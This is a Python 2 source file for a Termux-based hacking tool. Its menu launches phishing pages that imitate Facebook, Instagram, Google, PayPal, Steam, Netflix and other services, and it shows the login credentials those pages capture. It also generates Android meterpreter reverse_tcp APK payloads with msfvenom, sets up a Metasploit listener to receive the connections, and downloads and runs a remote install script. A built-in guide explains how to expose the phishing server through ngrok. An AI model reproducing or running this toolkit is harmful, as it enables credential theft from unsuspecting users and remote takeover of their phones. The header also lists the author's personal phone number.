#!/bin/env python2
# this tool created in year 2018
# Coded by sachin
# Studying manglore marine college and technology kuppepadav
# Branch civil
# this is my whats app number 8105190452
# i love coding , am not a cs student
# you can modify this tool

import os
from time import time, ctime
import sys

if sys.platform == "linux2":
	pass
else:
	print ""
	print "[x] Sory this tool not support in  windows"
	print ""
	exit() 
sys.path.append("files/facebook/php")
import fb
sys.path.append("files/instagram")
import insta
sys.path.append("files/gmail")
import gmail
sys.path.append("files/steam")
import steam
sys.path.append("files/paypal")
import paypal
sys.path.append("files/github")
import github
sys.path.append("files/stackoverflow")
import stack
sys.path.append("files/twitter")
import twitter
sys.path.append("files/wordpress")
import wordpress
sys.path.append("files/instafollowers")
import inf
sys.path.append("files/snapchat")
import snapchat
sys.path.append("files/netflix")
import netflix
sys.path.append("modules")
import gatherinfo
sys.path.append("modules")
import vers

def about():
 myself = '''
 \t\t Author      = Sachin
 \t\t mychannel   = https://youtu.be/Px7O1gNC9xg
 \t\t country     = India
 \t\t github link = https://github.com/sachin175638
 '''
 print myself
 qq = raw_input(":: Press enter ::")
def banner():
 os.system("sh modules/banner.sh")
def httpfileserver():
 print ''
 host = raw_input("Enter IP   : ")
# if host =="":
# 	print ''
#	print "invalid"
#	break
 port = raw_input("Enter port : ")
# if port =="":
#	print ''
#       print "invalid"
#	break

 
 h='"'+host+'"\n'
  
 p=port+"\n"
 
 out_file = open("pyserver.py", "w")
 out_file.write("import SimpleHTTPServer \n")
 out_file.write("import SocketServer \n")
 out_file.write("try:\n")
 out_file.write(" ht="+h)
 out_file.write(" pt="+p)
 out_file.write(" Handler = SimpleHTTPServer.SimpleHTTPRequestHandler \n")
 out_file.write(" httpd = SocketServer.TCPServer((ht, pt), Handler) \n")
 out_file.write(' print "serving at port http://"+ht+":"+str(pt) \n')
 out_file.write(" httpd.serve_forever()\n")
 out_file.write("except KeyboardInterrupt:\n")
 out_file.write(" print ''\n")
 out_file.write(" print 'ctrl+c detected'")
 out_file.close()
 xpath="modules/pyserver.py"
 if os.path.exists(xpath):
	os.system("rm modules/pyserver.py")
 os.system("mv pyserver.py modules")
def clear():
	os.system("clear")
	print ''
#	z = raw_input("Press Enter to continue ..")
def ipf():
	os.system("ifconfig")
	print ''
	z = raw_input("Press Enter to continue ..")

def guide():
	help = '''

 1. How to create localhost..?
 
 open termux and type [server]
 and select option 1 
 
 Enter port for example 4444,8080 etc and select your 
 webpage path
 example :-
        Enter port : 8080 
	File path  : /sdcard/yourfile
 press ctrl + c for close
 
 2. How to create phishing server ..?
 
 type [server] in termux and select option 3
 this shows some fake pages like facebook, instagram etc
 and select whatever you want by selecting number
 like 1 , 2 ,3 .. 99 for exit and it asks port , fill it 
 and press enter and open new session type [server] and 
 if you dont have ngrok and select option 5, after this 
 process again open new session and type 
 example :-
	./ngrok http 8080 this is for port forwarding
 
 3. How to check login credentials ..?

 type [server] in termux and select option 4

 Extra commands:
 
 Description                   options

 help                          -h/help
 ifconfig                      ifconfig
 clear screen                  clear
'''
 	print help
	print ''
	z = raw_input("Press Enter to continue ..")
	print ''
def bug():
	 print ""
	 print "Please give input"
	 print ''
	 print "Quitting"
	 os.system("sleep 2")
def amma():
 x = ""
 tt= ""
 os.system("sh modules/banner.sh")
 logo = '''
              \033[1;36m
                     [+] coded by sachin
 \033[1;39m
 '''
 print logo
 while x != "99":
  try:
#	os.system("clear")
# 	os.system("sh modules/banner.sh")
 	logo1 = '''
                            MAIN

      [\033[1;32m1\033[1;39m] - Localhost         [\033[1;32m8\033[1;39m] - Start lisitner
      [\033[1;32m2\033[1;39m] - Webhost           [\033[1;32m9\033[1;39m] - IP_tools 
      [\033[1;32m3\033[1;39m] - Phishing server   [\033[1;32m10\033[1;39m] - http file server
      [\033[1;32m4\033[1;39m] - Check Logs       
      [\033[1;32m5\033[1;39m] - Download ngrok      
      \033[1;31m[\033[1;36m6\033[1;39m\033[1;31m]\033[1;39m - Check Update
      [\033[1;32m7\033[1;39m] - Create payload

      {\033[1;32m99\033[1;39m}  - exit
 '''
 	print logo1
	red = "\033[1;31m"
	print red
	x = raw_input("\033[1;31m[+] Select \033[1;32m>> \033[1;39m ")
	if x == "1":
		print ''
		port= raw_input("Enter port : ")
		if port == "":
			bug()
			break
		file = raw_input("File path  : ")
		if file == "":
			bug()
			break
		os.system("php -S localhost:"+port+" -t "+file)
	elif x=="2":
		print ''
		ip = raw_input("Enter ip   : ")
		if ip == "":
			bug()
			break
		port = raw_input("Enter port : ")
		if port == "":
			bug()
			break
		file = raw_input("File path  : ")
		if file == "":
			bug()
			break
		os.system("php -S "+ip+":"+port+" -t "+file)
	elif x == "3":
		while 1:
		  try:
#			os.system("clear")
#			os.system("clear")
			print "\033[1;39m"
		#	os.system("figlet +Phishing+")
		#	print '\033[1;39m    ============================='
#			os.system("sh modules/banner.sh")
			sp = '''\033[1;32m
	       ------===PHISHING SQUAD===------
			\033[1;39m
			'''
			print sp
			print "\033[1;39m      [\033[1;32m1\033[1;39m] - Facebook page      [\033[1;32m7\033[1;39m] - stackoverflow"
			print "      [\033[1;32m2\033[1;39m] - Instagram page     [\033[1;32m8\033[1;39m] - twitter"
			print "      [\033[1;32m3\033[1;39m] - google             [\033[1;32m9\033[1;39m] - wordpress"
			print "      [\033[1;32m4\033[1;39m] - steam              [\033[1;32m10\033[1;39m] - insta-followers   "
			print "      [\033[1;32m5\033[1;39m] - paypal             [\033[1;32m11\033[1;39m] - snapchat"
			print "      [\033[1;32m6\033[1;39m] - github             [\033[1;32m12\033[1;39m] - netflix "
			print ""
			print "      {\033[1;32m99\033[1;39m} - back"
		#	print "    ============================="
			print "\033[1;36m"
			y = raw_input("\033[1;31m[+] Select >> \033[1;39m ")
			if y == "1":
				os.system("bash .facebook.sh")
			elif y == "2":
				os.system("bash .instagram.sh")
			elif y == "3":
				os.system("bash .gmail.sh")
			elif y == "4":
				os.system("bash .steam.sh")
			elif y == "5":
				os.system("bash .paypal.sh")
			elif y == "6":
				os.system("bash .github.sh")
			elif y == "7":
				os.system("bash .stackoverflow.sh")
			elif y == "8":
				os.system("bash .twitter.sh")
			elif y == "9":
				os.system("bash .wordpress.sh")
			elif y == "10":
				os.system("bash .inf.sh")
			elif y == "11":
				os.system("bash .snapchat.sh")
			elif y == "12":
				os.system("bash .netflix.sh")
			elif y== "99":
				break
			elif y=="-h":
				guide()
			elif y=="help":
				guide()
			elif y=="clear":
				clear()
			elif y=="ifconfig":
				ip()
		#	elif y=="update":
		#		update()
			else:
				print "[x] Invalid option "
				print ''
				v = raw_input("Press enter to continue ..") 
		  except KeyboardInterrupt:
			print ""
			print "Exiting ...."
			os.system("sleep 2")
	elif x == "4":
		while 1:
#			os.system("clear")
#			os.system("sh modules/banner.sh")
			login = '''\033[1;32m
	      ------===Login Credentials===------\033[1;39m
			'''
			print login
		#	print "===================="
			print "\033[1;39m      [\033[1;32m1\033[1;39m] - facebook log      [\033[1;32m7\033[1;39m] - stackoverflow log"
			print "      [\033[1;32m2\033[1;39m] - instagram log     [\033[1;32m8\033[1;39m] - twitter log"
			print '      [\033[1;32m3\033[1;39m] - gmail or google   [\033[1;32m9\033[1;39m] - wordpress log'
			print "      [\033[1;32m4\033[1;39m] - steam log         [\033[1;32m10\033[1;39m] - insta-followers"
			print "      [\033[1;32m5\033[1;39m] - paypal log        [\033[1;32m11\033[1;39m] - snapchat"
			print "      [\033[1;32m6\033[1;39m] - github log        [\033[1;32m12\033[1;39m] - netflix"
			print ''
			print "      {\033[1;32m99\033[1;39m} - back "
			print ''
			z = raw_input("\033[1;31m[+] Select >> \033[1;39m ")
			print ''
			if z =="1":
				fb.fbcre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="2":
				insta.instacre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="3":
				gmail.gmailcre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="4":
				steam.steamcre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="5":
				paypal.paypalcre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="6":
				github.githubcre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="7":
				stack.stackcre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="8":
				twitter.twittercre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="9":
				wordpress.wordpresscre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="10":
				inf.infcre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z == "11":
				snapchat.snapchatcre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z == "12":
				netflix.netflixcre()
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z == "99":
				break
			elif z == "-h":
				guide()
			elif z == "help":
				guide()
			elif z == "clear":
				clear()
			elif z == "ifconfig":
				ip()
			else:
				print "[x] invalid option"
				print "Type -h/help for guide"
				print ''
				q = raw_input("Press Enter to continue ... ")
	elif x == "5":
		os.system("sh ngrok/ng.sh")
	elif x == "6":
		vers.ves()
		print ''
		cont = raw_input("Press enter ..")
	elif x == "7":
		while 1:
#			os.system("clear")
#			os.system("sh modules/banner.sh")
			ammamma = '''\033[1;32m
	       ------===Create Payload===------\033[1;39m
			'''
			print ammamma
			print '\033[1;39m'
			print "      [\033[1;32m1\033[1;39m] - Create Payload"
			print "      [\033[1;32m2\033[1;39m] - File share"
			print ""
			print "      {\033[1;32m99\033[1;39m}- back"
			print ''
			c = raw_input("\033[1;31m[+] Select >> \033[1;39m ")
			if c =="clear":
				clear()
			elif c =="ifconfig":
				ip()
			elif c =="-h":
				guide()
			elif c =="1":
				sanjana = "/data/data/com.termux/files/usr/bin/msfvenom"
				if os.path.exists(sanjana):
					lhost = raw_input("Enter LHOST : ")
					if lhost == "":
						continue
					lport = raw_input("Enter LPORT : ")
					if lport == "":
						continue
					name = raw_input("Give payload name : ")
					if name == "":
						continue
					check = "meta/"+name+".apk"
					if os.path.exists(check):
						print ""
						print "[x]This file name already exists"
						print ''
						putti = raw_input("Press Enter ..")
						continue
					os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" R> meta/"+name+".apk")
					print ''
					print "Check your payload in /meta folder"
					print ''
					cc = raw_input("press Enter to continue ...")
				else:
					print ''
					print "[x] msfvenom not found. Please install metasploit-framework !"
					print ''
					sanjana1 = "/data/data/com.termux/files/home/metasploit.sh"
					if os.path.exists(sanjana1):
						os.system("rm /data/data/com.termux/files/home/metasploit.sh")
					bairamma=raw_input("Do you want to install metasploit-framework y/n : ")
					if bairamma == "y":
						os.system("curl -LO https://raw.githubusercontent.com/sachin175638/server1/master/metasploit.sh")
						os.system("mv metasploit.sh $HOME")
						os.system("bash $HOME/metasploit.sh")
						os.system("rm $HOME/metasploit.sh")
			elif c =="2":
				os.system("bash mdf.sh")
			elif c =="help":
				guide()
			elif c =="99":
				break
			else:
				print "[x] invalid option"
				print "Type -h/help for guide"
				print ''
				q = raw_input("Press Enter to continue ... ")
	elif x == "8":
		sanjana = "/data/data/com.termux/files/usr/bin/msfconsole"
		if os.path.exists(sanjana):
			print ""
			os.system("rm -rf meta/file.rc")
			out_file = open("file.rc", "w")
			port = raw_input("Enter port :- ")
			if port == "":
				continue
			lhost = raw_input("Enter lhost :- ")
			if lhost == "":
				continue
			out_file.write("use exploit/multi/handler"+"\n"+"set payload android/meterpreter/reverse_tcp"+"\n"+"set lhost "+lhost+"\n"+"set lport "+port+"\n"+"exploit")
			out_file.close()
			os.system("mv file.rc meta")
			os.system("pg_ctl -D $PREFIX/var/lib/postgresql start")
			os.system("msfconsole -r meta/file.rc")
		else:
			print ''
			print "[x] msfconsole not found. Please install metasploit-framework !"
			print ''
			sanjana1 = "/data/data/com.termux/files/home/metasploit.sh"
			if os.path.exists(sanjana1):
				os.system("rm /data/data/com.termux/files/home/metasploit.sh")
			bairamma=raw_input("Do you want to install metasploit-framework y/n : ")
			if bairamma == "y":
				os.system("curl -LO https://raw.githubusercontent.com/sachin175638/server1/master/metasploit.sh")
				os.system("mv metasploit.sh $HOME")
				os.system("bash $HOME/metasploit.sh")
				os.system("rm $HOME/metasploit.sh")
#			os.system("sleep 2")
	elif x == "9":
		os.system("rm -rf modules/gatherinfo.pyc")
#		os.system("sh modules/banner.sh")
		sachin ='''\033[1;32m
	         ------===IP tools ===------\033[1;39m
		'''
		print sachin
		gatherinfo.bbsad()
		os.system("rm -rf modules/gatherinfo.pyc")
	elif x =="10":
		httpfileserver()
		file = raw_input("Enter destination path : ")
		dupli = file+"\n"
		if file=="":
			return
		boothappa=file+"/pyserver.py"
		if os.path.exists(boothappa):
			print "[-] Old pyserver.py file detected in ",file
			os.system("rm "+boothappa)
			print "[+] removed old pyserver.py file from path ",boothappa
		os.system("cp modules/pyserver.py "+file)
		wax="modules/mmct.sh"
		if os.path.exists(wax):
			os.system("rm modules/mmct.sh")
		out_file = open("mmct.sh", "w")
		out_file.write("cd "+dupli)
		out_file.write("python2 pyserver.py")
		out_file.close()
		os.system("mv mmct.sh modules")
		print "[+] New pyserver.py file generated in path",file
		print "[+] You can also modify file ",file+"/pyserver.py" 
		print '' 
		os.system("sh modules/mmct.sh")
	elif x == "":
		print ""
		print "Why , plz give input .."
		print "Type -h/help for guide"
		print ''
		q = raw_input("Press Enter to continue ... ")
	elif x == "99":
		print ''
		print "Bye Bye "
		print ''
	elif x == "-h":
		guide()
	elif x == "help":
		guide()
	elif x == "clear":
		clear()
	elif x == "ifconfig":
		ipf()
	elif x =="banner":
		banner()
        elif x =="about":
		about()
#	elif x == "update":
#		path="$HOME/update.sh"
#		if os.path.exists(path):
#			os.system("rm -rf $HOME/update.sh")
#		os.system("mv module/update.sh $HOME")
#		os.system("chmod +x $HOME/update.sh")
#		os.system("sh $HOME/update.sh")
	else:
		print ""
		print "[x] invalid option"
		print "Type -h/help for guide"
		print ''
		z = raw_input("Press enter to continue ..")
#	elif x == "99":
#		os.system("clear")
#		break
  except:
	print ""
	print "exiting ....."
	os.system("sleep 1")
amma()
